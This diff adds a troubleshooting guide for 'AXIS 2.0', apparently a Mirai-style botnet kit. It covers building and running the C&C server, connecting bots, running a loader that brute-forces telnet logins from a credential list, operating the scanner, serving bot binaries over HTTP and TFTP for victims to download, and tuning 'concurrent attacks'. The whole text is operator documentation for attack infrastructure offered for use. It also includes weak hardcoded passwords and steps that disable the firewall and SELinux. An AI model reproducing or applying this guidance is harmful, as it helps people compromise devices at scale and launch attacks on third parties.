@@ -1,0 +1,409 @@
+================================================================================
+                    AXIS 2.0 TROUBLESHOOTING GUIDE
+================================================================================
+
+Common issues and solutions for AXIS 2.0 installation and operation.
+
+================================================================================
+BUILD ISSUES
+================================================================================
+
+PROBLEM: "gcc: command not found"
+SOLUTION: 
+  Ubuntu/Debian: apt install build-essential
+  CentOS: yum install gcc gcc-c++ make
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "go: command not found"
+SOLUTION:
+  export PATH=$PATH:/usr/local/go/bin
+  echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "cannot find -lmysqlclient"
+SOLUTION:
+  Ubuntu/Debian: apt install libmysqlclient-dev
+  CentOS: yum install mysql-devel
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Cross-compiler not found for architecture
+SOLUTION:
+  # Skip that architecture or install compiler
+  Ubuntu: apt install gcc-arm-linux-gnueabi
+  Or edit build.sh and comment out that architecture
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "package not found" for Go dependencies
+SOLUTION:
+  cd cnc
+  go mod init production-cnc
+  go get github.com/go-sql-driver/mysql
+  go get github.com/mattn/go-shellwords
+
+================================================================================
+DATABASE ISSUES
+================================================================================
+
+PROBLEM: "Can't connect to MySQL server"
+SOLUTION:
+  # Check if MariaDB is running
+  systemctl status mariadb
+  
+  # Start if not running
+  systemctl start mariadb
+  
+  # Check configuration
+  netstat -tulpn | grep 3306
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "Access denied for user"
+SOLUTION:
+  # Reset database credentials
+  mysql -u root -p << EOF
+  UPDATE mysql.user SET Password=PASSWORD('axis123') WHERE User='axis';
+  FLUSH PRIVILEGES;
+  EOF
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "Database not found"
+SOLUTION:
+  # Create database
+  mysql -u root -p -e "CREATE DATABASE AXIS2;"
+  mysql -u root -p < database.sql
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Tables not created
+SOLUTION:
+  # Manually run SQL
+  mysql -u root -p AXIS2 < database.sql
+  
+  # Verify tables
+  mysql -u root -p -e "USE AXIS2; SHOW TABLES;"
+
+================================================================================
+C&C SERVER ISSUES
+================================================================================
+
+PROBLEM: C&C won't start
+SOLUTION:
+  # Check database connection in cnc/main.go
+  # Verify credentials match database
+  # Check if port is in use
+  netstat -tulpn | grep 3778
+  
+  # Kill existing process
+  killall cnc_server
+  ./cnc_server
+
+--------------------------------------------------------------------------------
+
+PROBLEM: "Address already in use"
+SOLUTION:
+  # Find process using port
+  lsof -i :3778
+  
+  # Kill process
+  kill -9 [PID]
+  
+  # Or change port in main.go
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Admin can't login
+SOLUTION:
+  # Reset admin password
+  mysql -u root -p AXIS2 -e "UPDATE users SET password='admin123' WHERE username='admin';"
+  
+  # Verify user exists
+  mysql -u root -p AXIS2 -e "SELECT * FROM users;"
+
+--------------------------------------------------------------------------------
+
+PROBLEM: API not working
+SOLUTION:
+  # Check API port is open
+  netstat -tulpn | grep 3779
+  
+  # Verify API code in database
+  mysql -u root -p AXIS2 -e "SELECT api_key FROM users;"
+
+================================================================================
+BOT CONNECTION ISSUES
+================================================================================
+
+PROBLEM: Bots won't connect
+SOLUTION:
+  # Check CNC_ADDR in bot/config.h
+  # Verify server IP is correct
+  # Check firewall allows port 3778
+  
+  # Test connection
+  telnet [SERVER_IP] 3778
+  
+  # Check C&C is running
+  ps aux | grep cnc_server
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Bots connect then disconnect
+SOLUTION:
+  # Check ulimit
+  ulimit -n 999999
+  
+  # Check server resources
+  free -h
+  df -h
+  
+  # Check for OOM killer
+  dmesg | grep -i "killed process"
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Wrong architecture detected
+SOLUTION:
+  # Check loader architecture detection
+  # Verify binary exists for architecture
+  ls -la /var/www/html/bins/
+  
+  # Add missing architecture binary
+
+================================================================================
+LOADER ISSUES
+================================================================================
+
+PROBLEM: Loader won't start
+SOLUTION:
+  # Check if binary exists
+  ls -la loader
+  
+  # Check dependencies
+  ldd loader
+  
+  # Rebuild loader
+  cd loader && gcc -o ../loader *.c -lpthread
+
+--------------------------------------------------------------------------------
+
+PROBLEM: No successful logins
+SOLUTION:
+  # Check credential list
+  cat list.txt
+  
+  # Verify format: IP:PORT user:pass
+  
+  # Check telnet port is accessible
+  nc -zv [TARGET_IP] 23
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Upload fails
+SOLUTION:
+  # Check web server is running
+  systemctl status apache2
+  
+  # Verify bins directory permissions
+  chmod 777 /var/www/html/bins
+  
+  # Test download
+  wget http://[SERVER_IP]/bins/axis.x86_64
+
+================================================================================
+SCANNER ISSUES
+================================================================================
+
+PROBLEM: scanListen won't start
+SOLUTION:
+  # Check port is free
+  netstat -tulpn | grep 9555
+  
+  # Check binary exists
+  ls -la scanListen
+  
+  # Rebuild
+  go build -o scanListen scanListen.go
+
+--------------------------------------------------------------------------------
+
+PROBLEM: No scan results
+SOLUTION:
+  # Check scanner is running on bots
+  # Verify SCAN_CB_PORT in bot config
+  # Check firewall allows port 9555
+  
+  # Test manually
+  echo -e "\x00\x00\x00\x00" | nc localhost 9555
+
+================================================================================
+WEB SERVER ISSUES
+================================================================================
+
+PROBLEM: Binaries not downloading
+SOLUTION:
+  # Check Apache is running
+  systemctl status apache2
+  
+  # Verify file exists
+  ls -la /var/www/html/bins/
+  
+  # Check permissions
+  chmod 644 /var/www/html/bins/*
+  
+  # Test download
+  curl http://[SERVER_IP]/bins/axis.x86_64
+
+--------------------------------------------------------------------------------
+
+PROBLEM: TFTP not working
+SOLUTION:
+  # Check TFTP is running
+  systemctl status tftpd-hpa
+  
+  # Verify directory
+  ls -la /var/lib/tftpboot/
+  
+  # Check xinetd
+  systemctl status xinetd
+
+================================================================================
+FIREWALL ISSUES
+================================================================================
+
+PROBLEM: Can't connect to server
+SOLUTION:
+  # Check firewall status
+  ufw status
+  firewall-cmd --list-all
+  
+  # Open required ports
+  ufw allow 3778/tcp
+  ufw allow 3779/tcp
+  ufw allow 9555/tcp
+  ufw allow 80/tcp
+  
+  # Or disable for testing
+  ufw disable
+
+--------------------------------------------------------------------------------
+
+PROBLEM: SELinux blocking
+SOLUTION:
+  # Check status
+  getenforce
+  
+  # Temporarily disable
+  setenforce 0
+  
+  # Or configure properly
+  setsebool -P httpd_can_network_connect 1
+
+================================================================================
+PERFORMANCE ISSUES
+================================================================================
+
+PROBLEM: Server running slow
+SOLUTION:
+  # Check resources
+  htop
+  df -h
+  free -h
+  
+  # Increase ulimit
+  ulimit -n 999999
+  ulimit -u 999999
+  
+  # Check for too many connections
+  netstat -an | grep ESTABLISHED | wc -l
+
+--------------------------------------------------------------------------------
+
+PROBLEM: High CPU usage
+SOLUTION:
+  # Check attack load
+  # Reduce max bots per user
+  # Limit concurrent attacks in database
+
+--------------------------------------------------------------------------------
+
+PROBLEM: Running out of disk space
+SOLUTION:
+  # Clear old logs
+  > logs/commands.txt
+  > logs/logins.txt
+  > telnet.txt
+  
+  # Rotate logs
+  logrotate -f /etc/logrotate.conf
+
+================================================================================
+LOG FILES
+================================================================================
+
+C&C Logs:
+  logs/commands.txt - Admin commands
+  logs/logins.txt - Login attempts
+
+Scanner Logs:
+  telnet.txt - Scan results
+
+System Logs:
+  /var/log/syslog - System messages
+  /var/log/auth.log - Authentication
+  /var/log/apache2/error.log - Web server
+
+Database Logs:
+  /var/log/mysql/error.log
+
+================================================================================
+DEBUG MODE
+================================================================================
+
+Enable debug output:
+
+# C&C Server
+Edit cnc/main.go, add fmt.Println() statements
+
+# Bot
+Recompile with debug flags:
+gcc -DDEBUG -g -o bot bot/*.c
+
+# Loader
+Run with strace:
+strace -f ./loader
+
+================================================================================
+GETTING HELP
+================================================================================
+
+1. Check this troubleshooting guide
+2. Review installation tutorials
+3. Check log files for errors
+4. Verify all services are running
+5. Test each component individually
+
+Common diagnostic commands:
+
+# Check all services
+ps aux | grep -E 'cnc|scan|loader'
+
+# Check all ports
+netstat -tulpn
+
+# Check database
+mysql -u axis -paxis123 AXIS2 -e "SHOW STATUS;"
+
+# Check web server
+curl -I http://localhost/bins/
+
+# Check system resources
+htop
+df -h
+free -h
+
+================================================================================
